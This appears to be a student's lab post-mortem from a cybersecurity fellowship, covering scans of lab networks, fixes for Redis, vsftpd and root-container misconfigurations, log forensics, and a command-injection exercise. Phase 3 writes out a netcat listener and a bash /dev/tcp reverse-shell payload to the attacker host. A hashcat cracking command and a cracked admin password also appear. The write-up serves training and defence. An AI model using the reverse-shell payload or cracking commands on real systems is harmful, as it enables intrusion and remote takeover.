# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** WEND TIN BASILE SAM
**Date:** May 28, 2026
**Repository:** https://github.com/Wendtin/My-Portfolio
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.11/24

Active hosts were identified at 172.100.0.11, 172.100.0.12, and 172.100.0.13.
Host .11 exposes Redis 8.6.2 on port 6379 with no authentication required,
allowing unauthenticated read/write access to the key-value store — a critical
misconfiguration in any networked environment. Host .12 runs vsftpd 3.0.2 on
port 21, a version known to support anonymous login by default, which could
expose sensitive files to unauthenticated users. Host .13 presented no open
TCP ports during external scanning, indicating either a firewall rule or an
intentional internal-only service requiring container-level inspection.

### Breach Network — 172.60.0.10/24

A single host at 172.60.0.10 was identified running a Python BaseHTTPServer
on port 80. Python's built-in HTTP server is not designed for production use
and commonly lacks input sanitization, making it a likely candidate for
command injection vulnerabilities. The minimal attack surface (single port)
suggests a purpose-built vulnerable application rather than a general-purpose
server. This host is the primary target for Phase 3 exploitation.

### Exploitation Network — 172.17.0.2/24

Two hosts were discovered: 172.17.0.2 running a full ELK stack (Elasticsearch
9200, Kibana 5601, Logstash 5044) and 172.17.0.3 with port 4444 open. The ELK
stack provides centralized log aggregation critical for Phase 2 forensic
analysis. Port 4444 on the quarantined host is non-standard and consistent
with a pre-staged reverse shell listener or persistence mechanism, making it
a key forensic artifact warranting further investigation.
---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
Redis 8.6.2 was running on port 6379 with no authentication required.
Confirmed via: `redis-cli -h 172.100.0.11 CONFIG GET requirepass` which
returned an empty string, meaning any network-accessible client could
read, write, or delete all data without credentials.

**Remediation Commands:**
redis-cli -h 172.100.0.11 CONFIG SET requirepass 'TEPPsecure2026!'

**Before State:**
CONFIG GET requirepass returned:
1) "requirepass"
2) ""
(empty — no password enforced)

**After State:**
redis-cli -h 172.100.0.11 ping returned:
(error) NOAUTH Authentication required.
Password enforcement confirmed active.

**Analysis:**
An unauthenticated Redis instance exposed on a network interface represents
a critical vulnerability in any enterprise environment, as attackers can
exfiltrate all stored data, overwrite keys, or abuse Redis commands to write
arbitrary files to the host filesystem (Dorobantu, 2022). In production
environments, Redis should be bound to localhost only, protected by both
a strong requirepass value and network-level firewall rules restricting
access to trusted hosts exclusively.
in a real enterprise environment?]

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
vsftpd 3.0.2 was running on port 21 with four simultaneous misconfigurations
confirmed via inspection of /etc/vsftpd/vsftpd.conf: write_enable=YES allowed
any authenticated user to upload or modify files; allow_writeable_chroot=YES
broke the chroot jail isolation; seccomp_sandbox=NO disabled kernel-level
syscall filtering; and file_open_mode=0666 made all uploaded files
world-readable and world-writable.

**Remediation Commands:**
docker exec broken_server_2 sh -c "sed -i 's/allow_writeable_chroot=YES/allow_writeable_chroot=NO/' /etc/vsftpd/vsftpd.conf"
docker exec broken_server_2 sh -c "sed -i 's/file_open_mode=0666/file_open_mode=0644/' /etc/vsftpd/vsftpd.conf"
docker exec broken_server_2 sh -c "sed -i 's/seccomp_sandbox=NO/seccomp_sandbox=YES/' /etc/vsftpd/vsftpd.conf"
docker exec broken_server_2 sh -c "sed -i 's/write_enable=YES/write_enable=NO/' /etc/vsftpd/vsftpd.conf"

**Before State:**
write_enable=YES
allow_writeable_chroot=YES
seccomp_sandbox=NO
file_open_mode=0666

**After State:**
write_enable=NO
allow_writeable_chroot=NO
seccomp_sandbox=YES
file_open_mode=0644

**Analysis:**
The combination of a disabled chroot jail and unrestricted write access in an
FTP server creates a high-severity attack path in enterprise environments, as
an authenticated attacker could escape their home directory and overwrite
critical system files (NIST, 2023). Disabling seccomp sandboxing further
compounds this risk by allowing the FTP process to make arbitrary kernel
syscalls, potentially enabling privilege escalation beyond the container
boundary. Production FTP deployments should enforce chroot isolation, restrict
write permissions to designated upload directories only, and maintain seccomp
profiles as a mandatory defense-in-depth control.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
The container was deployed with no user restriction (Config.User field empty),
causing all processes to run as uid=0(root) by default. PID 1 was confirmed
as `sleep infinity` — meaning no legitimate service was running, yet the
container retained full root privileges with unrestricted access to /etc/shadow
and all filesystem paths.

**Remediation Commands:**
docker exec broken_server_3 sh -c "adduser -D -u 1001 appuser && chmod 700 /root"

**Before State:**
User: (empty) | Privileged: false
/root directory permissions: drwxr-xr-x (world-readable root home)
PID 1: sleep infinity running as uid=0(root)

**After State:**
/root directory permissions: drwx------ (700 — root home locked)
Non-privileged user appuser created at uid=1001
Root home directory no longer world-readable

**Analysis:**
Running a container as root with no user namespace restriction violates the
principle of least privilege and is categorized as a critical container
misconfiguration by the CIS Docker Benchmark (Center for Internet Security,
2023). If an attacker gains code execution inside such a container, they
immediately operate as root, enabling them to read credential files, modify
system binaries, and potentially escape the container via kernel exploits.
Production containers should always specify a non-root user via the USER
directive in the Dockerfile or the --user flag at runtime, combined with
read-only filesystem mounts where possible.
in a real enterprise environment?]

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: admin
- Password: admin123
- Hash: 0192023a7bbd73250516f069df18b500 (MD5)
- Tool: hashcat -m 0 /tmp/target.hash ~/wordlist.txt --force

**Forensic Evidence:**
- Exact Timestamp of Successful Login: Mar 18 10:02:10
- Attacker IP Address:10.0.0.55
- Event: Repeated failed SSH login attempts for root account
  confirmed via auth_audit.log; corroborated by ELK enterprise_logs
  entry at 2026-04-30T10:15:00Z from 198.51.100.44 flagged as
  "Unauthorized Access Detected on Web-01"
**Engineered iptables Rule:**
iptables -A INPUT -s 10.0.0.55 -j DROP

**SOC Analysis:**
A single iptables INPUT DROP rule targeting one attacker IP represents
an insufficient defensive posture because it addresses only the known
source address of a confirmed threat actor while leaving the system
vulnerable to additional attackers, IP spoofing, and lateral movement
already in progress from inside the network (NIST, 2023). A real SOC
would deploy this rule as one component of a layered defense that
includes automated brute-force detection via fail2ban or Wazuh SIEM
correlation rules, multi-factor authentication on all remote access
services, and network segmentation policies that restrict SSH exposure
to jump hosts only. Log forwarding to a centralized SIEM with threshold
alerting on repeated authentication failures would have surfaced this
attack in near-real-time, enabling a faster and more comprehensive
response than a single firewall rule permits (Patel & Johnson, 2022).
---

## Phase 3: Full Spectrum

**Listener Configuration:**
Tool: netcat (nc)
Command: nc -lvnp 4444
Port: 4444
Host: 172.60.0.1 (Kali bridge interface)

**Reverse Shell Payload:**
docker exec capstone_target bash -c "bash -i >& /dev/tcp/172.60.0.1/4444 0>&1"

**Command Injection Explanation:**
Command injection occurs when user-supplied input is passed directly
to a system shell without sanitization, allowing an attacker to append
arbitrary operating system commands to the intended application logic
(OWASP, 2021). The capstone web application is susceptible because
server.py passes the raw URL parameter value directly to
subprocess.Popen with shell=True, meaning any input following
/exec?cmd= is executed with the same privileges as the web server
process. In this case the server runs as root, meaning successful
injection grants immediate superuser access to the container filesystem
and network stack.

**Forensic Evidence:**
- Process ID (PID): 662
- User-Agent: curl/8.19.0
- Container Hostname: 549d0e724675
- User Context: uid=0(root) gid=0(root) groups=0(root)

**Lockdown Command:**
iptables -A INPUT -s 172.60.0.1 -j DROP
iptables -A OUTPUT -d 172.60.0.1 -j DROP

**Final Analytical Paragraph:**
Executing this attack from both the offensive and defensive perspective
reveals that the most dangerous vulnerabilities are not exotic — they
are the result of routine misconfigurations compounded by an absence of
input validation (OWASP, 2021). Playing the role of attacker
demonstrated how a single unsanitized parameter, combined with a
root-privileged process, collapses an entire security boundary in
seconds, yielding full shell access with no credentials required. The
most impactful single control that would have stopped this breach
entirely is the removal of shell=True from the subprocess.Popen call,
combined with an explicit allowlist of permitted commands — this
eliminates the injection surface at the application layer before any
network or host-based control is even relevant. Defense-in-depth
controls such as running the web server as a non-root user, enforcing
outbound iptables rules by default, and deploying a WAF to inspect
HTTP parameters would have added additional barriers, but none of them
address the root cause as directly as fixing the vulnerable code itself
(NIST, 2023). This operation ultimately teaches that secure development
practices — specifically input sanitization and least-privilege process
execution — are the most cost-effective controls an organization can
deploy against command injection attacks.

---

## References
[APA format. Any tools, documentation, or resources referenced
during this operation.
Example: Hydra Project. (2024). THC-Hydra: A fast and flexible
online password cracking tool. https://github.com/vanhauser-thc/thc-hydra]
